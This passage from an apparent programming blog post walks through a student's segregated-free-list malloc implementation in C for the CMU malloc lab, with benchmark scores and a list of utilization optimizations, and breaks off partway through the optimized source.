class="number">1</span>));</span><br><span class="line">    heap_listp += <span class="number">2</span> * SWORD;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_SEGLIST; ++i)</span><br><span class="line">        head_seglp[i] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(CHUNKSIZE / SWORD)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">3</span> * SWORD)</span><br><span class="line">        asize = <span class="number">2</span> * DWORD;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) {</span><br><span class="line">        place (bp, asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / SWORD)) == <span class="literal">NULL</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    set_nextblock_alloc_prev(bp, <span class="number">0</span>);</span><br><span class="line">    insert_freeblock(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) {</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> osize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> asize = size &lt;= <span class="number">3</span> * SWORD ? <span class="number">2</span> * DWORD : DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (osize &gt;= asize + <span class="number">2</span> * DWORD) {</span><br><span class="line">        <span class="type">void</span>* old_bp = bp;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(osize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(osize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">0</span>);</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">        <span class="keyword">return</span> old_bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osize &gt;= asize) {</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* new_bp = mm_malloc(size);</span><br><span class="line">        <span class="keyword">if</span> (new_bp == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">memcpy</span>(new_bp, bp, osize - SWORD);</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> new_bp;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>and the score is...</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000104 54540</span><br><span class="line"> 1       yes   99%    5848  0.000102 57333</span><br><span class="line"> 2       yes   99%    6648  0.000123 53917</span><br><span class="line"> 3       yes   99%    5380  0.000114 47028</span><br><span class="line"> 4       yes   40%   14400  0.000346 41667</span><br><span class="line"> 5       yes   92%    4800  0.000175 27491</span><br><span class="line"> 6       yes   90%    4800  0.000206 23346</span><br><span class="line"> 7       yes   52%   12000  0.000124 96852</span><br><span class="line"> 8       yes   51%   24000  0.000248 96774</span><br><span class="line"> 9       yes   20%   14401  0.027726   519</span><br><span class="line">10       yes   31%   14401  0.000967 14889</span><br><span class="line">11       yes   77%   57716  0.000616 93649</span><br><span class="line">12       yes   51%  100000  0.001141 87665</span><br><span class="line">13       yes   99%   20000  0.000283 70746</span><br><span class="line">14       yes   71%  200400  0.003631 55193</span><br><span class="line">15       yes   53%    6495  0.000077 83806</span><br><span class="line">Total          70%  496983  0.035983 13811</span><br><span class="line"></span><br><span class="line">Perf index = 42 (util) + 40 (thru) = 82/100</span><br></pre></td></tr></table></figure>
<p>Excellent! We get a very decent score: a good score of utility and a
full score of throughput. But there are still much room to improve
utility.</p>
<p><strong>Seglist + Immediate Coalesce + Better Hit + Mini Block +
Realloc Optimization + Place Optimization</strong></p>
<p>We did the following optimizations on top of the basic seglist:</p>
<ul>
<li><em>Immediate Coalesce</em>: Deferred coalescing does not seem to
improve utility so a simpler immediate coalesce is employed.</li>
<li><em>Better Hit</em>: Starting from the first hit we further search
the next 100 free blocks and choose the most fittable one.</li>
<li><em>Mini Block</em>: Shrink the minimum block size to 8 bytes rather
than 16 bytes. This can be achieved by introducing an extra bit to store
whether the previous block is a mini block. This is applied for both
free blocks and allocated blocks.</li>
<li><em>Realloc Optimization</em>: If we cannot find an existing free
block during reallocation, and at the same time the block reallocated
lies at the end of the heap, we then extend the size we need rather than
the full size. For example, if the current block occupies 800 bytes and
the new size is 960 bytes, we only need to extend the heap for 160
bytes, not 960 bytes.</li>
<li><em>Place Optimization</em>: When splitting a free block, we place
the allocated block at the end of the free block if it's size is larger
than a threshold (set to 64 by default) and place it at the front
otherwise. This sometimes helps coalesce and reduce fragmentation.</li>
</ul>
<p>Experiments show that the last two techniques are critical to improve
utility whereas the first three have marginal effects.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">team_t</span> team = {</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">"Goodbye"</span>,</span><br><span class="line">    <span class="comment">/* First member's full name */</span></span><br><span class="line">    <span class="string">"Sulley"</span>,</span><br><span class="line">    <span class="comment">/* First member's email address */</span></span><br><span class="line">    <span class="string">"sulley@cs.cmu.edu"</span>,</span><br><span class="line">    <span class="comment">/* Second member's full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">"AnotherSulley"</span>,</span><br><span class="line">    <span class="comment">/* Second member's email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">"anothersulley@cs.cmu.edu"</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DWORD 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWORD 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of DWORD */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (DWORD-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Aligned size_t */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extend heap by this amount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;9)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return max */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN(x, y) ((x) &lt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bits into a word */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, prev_mini, prev_alloc, alloc) ((size) | (prev_mini) | (prev_alloc) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a double word at address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)      (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned int*)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)       (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)      (GET(p) &amp; 0x1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PREV_ALLO(p)  (GET(p) &amp; 0x2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PREV_MINI(p)  (GET(p) &amp; 0x4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr, compute the address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)  ((char *)(bp) - SWORD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)  ((char *)(bp) + GET_SIZE(HDRP(bp)) - DWORD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get and set a free block's next/prev pointer value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRVP(bp)     (*((unsigned int*)(bp) + 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_NXTP(bp)     (*(unsigned int*)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_PRVP(bp, v)  (*((unsigned int*)(bp) + 1) = (v))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_NXTP(bp, v)  (*(unsigned int*)(bp) = (v))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous qblocks */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DWORD)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_SEGLIST 21</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> lower_seg[N_SEGLIST] = { <span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="number">1</span> &lt;&lt; <span class="number">11</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">14</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>, <span class="number">1</span> &lt;&lt; <span class="number">17</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">19</span>, <span class="number">1</span> &lt;&lt; <span class="number">20</span>, <span class="number">1</span> &lt;&lt; <span class="number">21</span>, <span class="number">1</span> &lt;&lt; <span class="number">22</span> };</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> upper_seg[N_SEGLIST] = { <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="number">1</span> &lt;&lt; <span class="number">11</span>, <span class="number">1</span> &lt;&lt; <span class="number">12</span>, <span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">14</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>, <span class="number">1</span> &lt;&lt; <span class="number">17</span>, <span class="number">1</span> &lt;&lt; <span class="number">18</span>, <span class="number">1</span> &lt;&lt; <span class="number">19</span>, <span class="number">1</span> &lt;&lt; <span class="number">20</span>, <span class="number">1</span> &lt;&lt; <span class="number">21</span>, <span class="number">1</span> &lt;&lt; <span class="number">22</span>, <span class="number">1</span> &lt;&lt; <span class="number">32</span> - <span class="number">1</span> };</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* head_seglp[N_SEGLIST];</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* heap_listp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">find_segidx</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">1</span> &lt;&lt; <span class="number">22</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> mask, seg_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> x = size - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0xFFFF0000</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span 